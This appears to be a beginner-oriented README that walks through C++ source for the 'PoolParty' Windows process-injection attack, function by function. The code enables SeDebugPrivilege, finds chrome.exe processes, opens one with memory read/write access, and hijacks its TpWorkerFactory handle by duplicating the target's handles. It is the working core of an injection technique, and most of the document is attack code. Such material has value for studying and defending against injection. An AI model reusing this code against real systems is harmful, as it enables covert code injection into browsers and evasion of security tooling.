# Why Documenting the Algorithms of functions?
- This documentation is intended for people that has no experience with the Windows API, so it's a friendly tutorial to understand the code.

# main():
### Parameters:
### Return:
### Algorithm:
- Enable "SeDebugPrivilege" on current process with [setCurrentProcessPrivilege()](#setcurrentprocessprivilege) and print if no errors.
```cpp
int main() {
    setCurrentProcessPrivilege("SeDebugPrivilege");
    cout << "\nsetCurrentProcessPrivilege(): Exitoso";
```
- Get all PIDs whose process name matches "chrome.exe" with [getPidFromExe()](#getpidfromexe) and print it.
```cpp
    vector<DWORD> chromePids = getPidFromExe(L"chrome.exe");
    cout << "\nLos pids de chromeSon: ";
    for (auto const& c : chromePids)
        std::cout << " " << c;
```
- Loop through the retrieved PIDs, call **OpenProcess()** with each of them, takes the first that returns a valid handle and save the handler on hTarget.
- The **val**, **valExp**, **valTemp** functions validates all the parameters before call and the return value of the call. The **info()** returns a struct with debugging information to the **val** family functions.
- The **checkError** should be true if no errors ocurred during the loop (we send the **checkError** to the call of "val" function).
```cpp
    HANDLE hTarget = nullptr;
    bool checkError = false;
    int i = 0;
    for (; checkError == false && i < chromePids.size(); i++) {
        checkError = true;
        hTarget = val(info(CHECK_HANDLE,"13","",ErrorCout),   OpenProcess, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, chromePids[i]);
        valExp(info(CHECK_HANDLE,"13.5","",ErrorBool,&checkError),    hTarget);
    }
    if (checkError == true) {
        cout << "\nPid funcional: " << chromePids[i];
    }
```
- On [hijackProcessHandle()](#hijackprocesshandle) are the main code of the PoolParty Attack. If no errors here we get a handle to the TpWorkerFactory of the target process, then print it.
```cpp
    HANDLE hProp = val(info(CHECK_HANDLE,"14"),   hijackProcessHandle, wstring(L"TpWorkerFactory"), hTarget, WORKER_FACTORY_ALL_ACCESS);
    cout << "\nThe final target address: " << hProp;

    system("pause");

}
```

# setCurrentProcessPrivilege():
### Parameters:
- **LPCSTR privilegeStr** : A String of the privilege to be enabled in the current process.
### Return:
### Algorithm:
- Get a handler to the current process and get a token with this handler with **OpenProcessToken()**.
```cpp
void setCurrentProcessPrivilege(LPCSTR privilegeStr) {
    HANDLE hToken;
    HANDLE hCurrentProcess = GetCurrentProcess();
    val(info(CHECK_FALSE_NULL,"10"),   OpenProcessToken, hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
```
- Get the luid (the id of a privilege) of the privilegeStr with **LookupPrivilegeValueA()**.
```cpp
    LUID luid;
    val(info(CHECK_FALSE_NULL,"11"),   LookupPrivilegeValueA, "", privilegeStr, &luid);
```
- Initialize a **TOKEN_PRIVILEGES** struct with the retrieved luid and the **SeDebugPrivilege**. Then adjusting the privilege of the current process using the token and this struct with **AdjustTokenPrivileges()**.
```cpp
    TOKEN_PRIVILEGES tokenPriv = { 0 };
    tokenPriv.PrivilegeCount = 1;
    tokenPriv.Privileges[0].Luid = luid;
    tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //SE_PRIVILEGE_REMOVE elimina el privilegio, este lo habilita

    val(info(CHECK_FALSE_NULL,"12"),   AdjustTokenPrivileges, hToken, FALSE, &tokenPriv, 0, nullptr, nullptr);      //RAISE_FALSE_NULL(res, "12")
}
```

# getPidFromExe():
### Parameters:
- **const WCHAR exeName[260]** : A wchar array containing the name of the process whose PIDs will be retrieved.
### Return:
- **vector\<DWORD\>** : The list of the PIDs of the process, the PIDs are DoubleWORD numbers.
### Algorithm:
- Declare the result vector. Create a snapshot of the current processes running on the machine with **CreateToolHelp32Snapshot()**. This method is the standard way to get the process information of all processes running in a machine.
```cpp
vector<DWORD> getPidFromExe(const WCHAR exeName[260]) {
    vector<DWORD> result;

    HANDLE hSnapshot = val(info(CHECK_HANDLE,"15"),   CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0);
```
- Convert the snapshot to a linked list with "next" entries to be able to iterate over the list. We are using **Process32First()** to get this working and saving the linked list first entry in **entry**.
```cpp
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    val(info(CHECK_FALSE_NULL,"16"),   Process32First, hSnapshot, &entry);
```
- Iterate over the linked list comparing if the current process entry matches the **exeName** parameter and saving it if true. The loop ends when there are no more entries... And the final vector is returned.
```cpp
    do {
        if (!wcscmp(entry.szExeFile, exeName)) {
            result.push_back(entry.th32ProcessID);
        }
    } while ( val(info(NO_CHECK,"17"),   Process32Next, hSnapshot, &entry));

    return result;
}
```

# hijackProcessHandle():
### Parameters:
- **wstring wsObjectType** : A wstring containing the object type we want to hijack.
- **HANDLE hTarget** : The handle to the target process.
- **DWORD dwDesiredAccess** : The desired access macro defined in Windows API (We only use **WORKER_FACTORY_ALL_ACCESS**).
### Return:
- **HANDLE** : The handle to the hijacked process object.
### Algorithm:
- Get the target process information object in raw using [queryInfo()](#queryinfo) and the **NtQueryInformationProcess** as a callback to retrieve that object. Save the result in a vector of BYTEs called **pProcessInfo**.
- Then cast the address of the **pProcessInfo** vector to **PPROCESS_HANDLE_SNAPSHOT_INFORMATION** to access this undocumented structure.
```cpp
HANDLE hijackProcessHandle(wstring wsObjectType, HANDLE hTarget, DWORD dwDesiredAccess) {
    vector<BYTE> pProcessInfo = valTemp(info(NO_CHECK,"2.5"),   queryInfo, hTarget, NtQueryInformationProcess, ProcessHandleInformation);
    const auto pProcessHandleInfo = valExp(info(CHECK_BAD_PTR,"3"),   (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(pProcessInfo.data()));
```
- Loop through all the handlers in **pProcessHandleInfo**, lets disect this code into small parts.
```cpp
    for (auto i = 0; i < pProcessHandleInfo->NumberOfHandles; i++) {
        HANDLE hDuplicatedObj;
        val(info(CHECK_FALSE_NULL,"2"),   DuplicateHandle, hTarget, pProcessHandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObj, dwDesiredAccess, FALSE, 0);

        vector<BYTE> pObjectInfo = valTemp(info(NO_CHECK,"7"),   queryInfo, hDuplicatedObj, NtQueryObject, ObjectTypeInformation);
        auto pObjectTypeInfo = valExp(info(CHECK_BAD_PTR,"7.5"),   (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInfo.data()));

        if (wsObjectType != wstring(pObjectTypeInfo->TypeName.Buffer)) {
            continue;
        }

        wcout << "\npObjectTypeInfo: " << wstring(pObjectTypeInfo->TypeName.Buffer);
        return hDuplicatedObj;
    }
```
- We are only duplicating the current handler with **DuplicateHandle()**.
```cpp
    for (auto i = 0; i < pProcessHandleInfo->NumberOfHandles; i++) {
        HANDLE hDuplicatedObj;
        val(info(CHECK_FALSE_NULL,"2"),   DuplicateHandle, hTarget, pProcessHandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicatedObj, dwDesiredAccess, FALSE, 0);

```
- Getting the information object of the current handler with [queryInfo()](#queryinfo) and **NtQueryObject** as before.
- Then casting it to **PPUBLIC_OBJECT_TYPE_INFORMATION**.
```cpp
        vector<BYTE> pObjectInfo = valTemp(info(NO_CHECK,"7"),   queryInfo, hDuplicatedObj, NtQueryObject, ObjectTypeInformation);
        auto pObjectTypeInfo = valExp(info(CHECK_BAD_PTR,"7.5"),   (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInfo.data()));
```
- Checking if the parameter **wsObjectType** don't matches the typename of the current handler. If don't matches, then continue to the next handler.
- If matches, then print the result and return the handler.
```cpp
        if (wsObjectType != wstring(pObjectTypeInfo->TypeName.Buffer)) {
            continue;
        }

        wcout << "\npObjectTypeInfo: " << wstring(pObjectTypeInfo->TypeName.Buffer);
        return hDuplicatedObj;
    }
```
- Outside the loop, if the loop doesn't start or the function doesn't return inside the loop, throw a runtime error.
```cpp
    throw std::runtime_error("Failed to hijack object handle");
}
```

# queryInfo():
### Parameters:
- **HANDLE hProcess** : The handler to the process whose information object will be retrieved.
- **TFunc queryFunc** : (Template parameter) The callback to retrive the information object, in our case we use one of the folowing functions: **NtQueryInformationProcess** and **NtQueryObject**.
- **TInfoClass processInfoClass** : (Template parameter) A macro indicating the type of the retrieved object, this parameter is passed to **queryFunc** as a parameter.
### Return:
- **vector\<BYTE\>** : The read raw bytes of the information object, call .data() to get a pointer to the data and cast this value to the object type.
### Algorithm:
- Variables to be used in the next loop.
```cpp
vector<BYTE> queryInfo(HANDLE hProcess, TFunc queryFunc, TInfoClass processInfoClass) {
    ULONG InformationLength = 0;
    auto Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    std::vector<BYTE> Information;
```
- Here we try to guess the **InformationLength**, so the loop executes while there is a length mistmatch.
- Each iteration we resize **Information** to the retrieved **InformationLength** passed as reference in the **queryFunc()**.
```cpp
    do {
        Information.resize(InformationLength);
        Ntstatus = queryFunc(hProcess, processInfoClass, Information.data(), InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);
```
- After the loop we check if **Ntstatus** has no errors and return the **Information** variable.
```cpp
    valExp(info(CHECK_NTSTATUS, "1"),   Ntstatus);

    return Information;
}
```